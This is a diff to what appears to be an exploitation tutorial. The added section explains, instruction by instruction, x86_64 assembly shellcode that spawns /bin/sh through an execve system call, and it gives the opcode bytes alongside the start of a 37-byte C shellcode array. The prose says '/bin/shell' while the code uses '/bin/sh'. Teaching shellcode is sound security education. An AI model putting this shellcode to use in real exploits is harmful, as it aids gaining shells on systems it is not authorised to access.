@@ -222,7 +222,25 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## Shell Code <a name="section3"></a>
 
-The x86_64 binary shell code to execute `/bin/shell`via an `execve()` system call consists of the following 37 bytes 
+The  following x86_64 assembly code executes `/bin/shell`via an `execve()` system call.
+```assembly
+jmp string           ; \xeb\x17             jump to string:
+
+shellcode:
+pop %rdi             ; \x5f                  %rdi points to .string
+xor %rdx, %rdx       ; \x48\x31\xd2          %rdx contains NULL (or %dl 0x00)
+movb %dl, 0x7(%rdi)  ; \x88\x57\x07          copy 0x00 at end of .string
+mov %rdi, 0x8(%rdi)  ; \x48\x89\x7f\x08      copy .string addr into argv[0]
+mov %rdx, 0x10(%rdi) ; \x48\x89\x57\x10      copy NULL into argv[1]
+lea 0x8(%rdi), %rsi  ; \x48\x8d\x77\x08      copy addr of argv[] to %rsi
+movb $0x3b, %al      ; \xb0\x3b              set execve syscall code in %rax
+syscall              ; \x0f\x05              execute syscall
+
+string:
+call shellcode       ; \xe8\xe4\xff\xff\xff  push .string address on stack and jump to shellcode:
+.string "/bin/sh"    ; /bin/sh
+```
+The binary machine instructions result in the following 37 bytes of executable shell code
 ```C
 char shellcode[] =
    "\xeb\x17\x5f\x48\x31\xd2\x88\x57\x07\x48\x89\x7f\x08\x48\x89\x57" 
